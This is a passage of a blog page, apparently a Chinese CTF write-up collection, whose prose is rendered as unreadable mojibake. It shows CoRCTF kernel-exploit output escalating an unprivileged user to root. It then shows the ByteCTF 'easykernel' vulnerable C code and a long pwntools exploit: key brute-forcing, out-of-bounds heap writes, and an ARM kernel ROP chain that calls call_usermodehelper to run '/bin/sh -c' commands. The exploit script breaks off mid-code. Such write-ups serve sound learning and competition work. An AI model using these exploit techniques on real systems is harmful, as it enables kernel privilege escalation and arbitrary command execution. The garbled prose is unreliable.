<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoRCTF:/exp$ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">ctf@CoRCTF:/exp$ /myexp</span><br><span class="line">idx:0</span><br><span class="line">[*] get kernel_base_addr...</span><br><span class="line">[+] init_ipc_ns: 0xffffffffa603d7a0</span><br><span class="line">[+] kernel_base: 0xffffffffa5400000</span><br><span class="line">[+] init_task: 0xffffffffa60124c0</span><br><span class="line">[+] init_cred: 0xffffffffa6033060</span><br><span class="line">[*] search this process task_struct</span><br><span class="line">0 86</span><br><span class="line">86 86</span><br><span class="line">[*] get this process task_struct:0xffff8d5c46128040</span><br><span class="line">[*] now write for cred</span><br><span class="line">idx:1</span><br><span class="line">getshelling</span><br><span class="line">[*]----getshell ok</span><br><span class="line">root@CoRCTF:/exp# id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­¦ä¹ åˆ°äº†åœ¨æ‹¥æœ‰äº†<code>4kb</code>çš„uafæƒ…å†µä¸‹å¦‚ä½•ä½¿ç”¨<code>msg</code>è¿›è¡Œä»»æ„åœ°å€è¯»å’Œä»»æ„åœ°å€å†™çš„æ‰‹æ®µï¼Œè¿˜å¯¹<code>task_struct</code>è¿›è¡Œäº†ç›´è§‚çš„äº†è§£ï¼Œå½“ç„¶<code>msg</code>ä¸ä»…èƒ½ç”¨äº<code>4kb</code>æƒ…å†µä¸‹çš„<code>uaf</code>,å®ƒçš„åŠŸèƒ½éå¸¸å¼ºå¤§ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">bytectf easykernel å¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-09-30 19:47:01 / ä¿®æ”¹æ—¶é—´ï¼š19:48:16" itemprop="dateCreated datePublished" datetime="2022-09-30T19:47:01+08:00">2022-09-30</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="bytectf-easykernel-å¤ç°"><a href="#bytectf-easykernel-å¤ç°" class="headerlink" title="bytectf easykernel å¤ç°"></a>bytectf easykernel å¤ç°</h1><p>å­¦é•¿å‡ºçš„é¢˜ï¼Œåœ¨æ¯”èµ›ä¸­ç”±äºæ²¡æœ‰æ¥è§¦è¿‡å†…æ ¸socketå’ŒarmæŒ‡ä»¤é›†ï¼Œç„¶åå†åŠ ä¸Šidaåæ±‡ç¼–å‡ºæ¥çš„ä»£ç éå¸¸æŠ½è±¡ï¼Œçœ‹ä¸æ¸…æ¥šé€»è¾‘ï¼Œæ‰€ä»¥ç›´åˆ°æ¯”èµ›ç»“æŸéƒ½æ²¡æœ‰æ‰¾è§æ´åœ¨å“ªé‡Œï¼Œèœçš„ç¦»è°±ğŸ¤¦â€â™€ï¸ã€‚åªèƒ½åœ¨èµ›åå¤ç°å¤ç°è¿™æ ·å­äº†ã€‚</p>
<h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>èµ›åå°±å‘å­¦é•¿è¦åˆ°äº†æºç ï¼Œçœ‹æºç çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªè¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥æº¢å‡ºå†™ï¼Œä½†æ˜¯ç®¡é“æ¯æ¬¡ç”³è¯·åˆ°çš„å †å—çš„åç§»ä¸æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ä¸å¥½åˆ©ç”¨ï¼Œå½“æ—¶æ²¡æ³¨æ„åˆ°popçš„æ—¶å€™ä¸ä¼šæ¸…é™¤æ ‡å¿—ä½ï¼Œç»è¿‡å­¦é•¿æç¤ºæ‰æ³¨æ„åˆ°ï¼Œé‚£ä»è¿™ä¸ªè§’åº¦å°±å¥½åˆ©ç”¨å¤šäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">0x2000</span> &amp;&amp; cnt &amp;&amp; cnt &lt; <span class="number">0x10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            recv(buf, len, csock);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">block_struct</span> *<span class="title">blk</span> =</span> &amp;bpipe.blks[(bpipe.pos - <span class="number">1</span>) &amp; <span class="number">0x0f</span>];</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0x1000</span> - blk-&gt;tail;</span><br><span class="line">            <span class="keyword">if</span> (blk-&gt;can_merge &amp;&amp; left &gt;= len - <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                blk-&gt;tail = <span class="number">0x2000</span> - len;</span><br><span class="line">                <span class="built_in">memcpy</span>(blk-&gt;blk + blk-&gt;tail, buf, left);</span><br><span class="line">                push_bpipe_data(buf + (len - <span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0</span>, PUREDATA_BLK);</span><br><span class="line">                reply(<span class="string">&quot;[+] create pure data success!\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;[+] create pure data success!\n&quot;</span>), csock);</span><br><span class="line">                bfree(buf);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>å°±æ˜¯åˆ©ç”¨serverçš„<code>0x20</code>é€‰é¡¹æ¥å¡æ»¡ç®¡é“ï¼Œè¿™é‡Œé¢å°±æœ‰<code>can_merge=1</code>çš„ç®¡é“äº†ï¼Œç„¶ååœ¨å…¨éƒ¨<code>pop</code>å‡ºæ¥ï¼Œå†push<code>0x10</code>æƒé™ï¼Œå°±å¯ä»¥è®©<code>0x10</code>çš„çš„ç®¡é“çš„<code>can_merge=1</code>,ç„¶åå°±å¯ä»¥è¶Šç•Œè¯»å’Œè¶Šç•Œå†™äº†ã€‚æœ€åå†™<code>*callback_func</code>æŒ‡é’ˆæ¥å®Œæˆropã€‚</p>
<p>å¯æ˜¯è¿™æ˜¯å†…æ ¸socketä¸åƒä¸€èˆ¬çš„å†…æ ¸é¢˜å¯ä»¥ä¼ ä¸€ä¸ªç¨‹åºä¸Šå»ï¼Œè¿™è¯¥å¦‚ä½•ropå‘¢ï¼Œå­¦é•¿çš„expç»™äº†ä¸€ä¸ªæ€è·¯ï¼Œå†…æ ¸ä¸­æä¾›äº†ä¸€ä¸ª<code>call_usermodehelper</code>å‡½æ•°ï¼Œå…è®¸åœ¨å†…æ ¸æ€æ‰§è¡Œä¸€ä¸ªç”¨æˆ·æ€çš„ç¨‹åºï¼Œè€Œä¸”å‚æ•°æ¥å£å’Œç”¨æˆ·æ€çš„exec()ç³»åˆ—å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç¨‹åºåï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡é’ˆæ•°ç»„ï¼Œå­˜å‚¨ç€æ‰§è¡Œè¿™ä¸ªç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°ã€‚</p>
<p>æ‰€ä»¥åªè¦ropèƒ½å¤Ÿ1æ§åˆ¶<code>r0</code>å’Œ<code>r1</code>ç„¶åè®©<code>pc=</code>call_usermodehelperå°±å¥½äº†ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦ropå°±å¾—æ§åˆ¶sp,è®©spæŒ‡å‘æˆ‘ä»¬ç²¾å¿ƒå¸ƒç½®çš„å †å—ä¸Šï¼Œè¿™å…¶å®ç›´æ¥ç ´åäº†ç¨‹åºçš„ä¸Šä¸‹æ–‡ï¼Œå½“æ‰§è¡Œå®Œ<code>call_usermodehelper</code>å†ä»æ ˆä¸­å¯»æ‰¾ä¸Šä¸‹æ–‡æ¢å¤åˆ°åŸæ¥è°ƒç”¨å¤„å°±ä¼šå¤±è´¥ï¼Œæ‰€ä»¥ropé¦–å…ˆå¾—ä¿å­˜æ­£å¸¸çš„<code>sp</code>åœ°å€ï¼Œç„¶åå†æ ˆè¿ç§»ï¼Œæœ€åå†æ¢å¤<code>sp</code>ã€‚</p>
<p>æ‰€ä»¥å¯¹gadgetçš„å¯»æ‰¾è¿˜æ˜¯æœ‰ç‚¹è‹›åˆ»çš„ï¼Œæˆ‘è§‰å¾—ä¸æ˜¯å¾ˆå¥½æ‰¾ï¼Œå½“æŒ‰ç€å­¦é•¿çš„gadgetå¤ç°å®Œä¹‹åï¼Œå°è¯•è‡ªå·±åœ¨æ‰¾è§ä¸€å¥—gadget,æœ€åæˆåŠŸç®€åŒ–äº†ä¸€äº›å­¦é•¿çš„gadgetã€‚</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>gadgetæœªç®€åŒ–ç‰ˆ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(save_sp+heap),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">12</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                          pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                          sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                          rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                          pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c040</span>),stack+<span class="number">4</span>*<span class="number">19</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+save_sp-<span class="number">0x24</span>),stack+<span class="number">4</span>*<span class="number">22</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8022b754</span>),stack+<span class="number">4</span>*<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8022b754 &lt;dio_complete+120&gt;    ldr    ip, [r4, #0x24]</span></span><br><span class="line"><span class="string">    0x8022b758 &lt;dio_complete+124&gt;    stm    sp, &#123;r7, ip&#125;</span></span><br><span class="line"><span class="string">    0x8022b75c &lt;dio_complete+128&gt;    blx    r1 </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span 